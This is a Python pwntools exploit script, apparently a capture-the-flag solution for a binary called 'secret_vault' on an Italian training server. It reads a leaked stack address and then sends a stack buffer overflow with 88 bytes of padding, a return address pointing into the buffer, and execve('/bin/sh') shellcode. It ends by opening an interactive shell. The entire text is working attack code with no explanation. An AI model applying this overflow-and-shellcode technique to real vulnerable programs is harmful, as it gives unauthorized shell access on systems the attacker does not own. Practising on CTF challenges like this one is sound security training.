from pwn import *

elf = context.binary = ELF('./secret_vault')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("vault.challs.olicyber.it", 10006)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()
conn.recvuntil(b">")
conn.sendline(b"1")
conn.recvuntil(b"messaggio:")
conn.sendline(b"line")
conn.recvuntil(b"nte in ")
indirizzo = int(conn.recvline().decode()[:-2], 16)
print(hex(indirizzo))
conn.recvuntil(b">")
conn.sendline(b"1")
conn.recvuntil(b"messaggio:")
conn.sendline(b'A'*88 + p64(indirizzo+104) + b"/bin/sh\x00" + asm(f"""
    mov rdi, {str(hex(indirizzo + 96))}
    mov rsi, 0
    mov rdx, 0
    mov rax, 0x3b
    syscall
    """))
conn.interactive()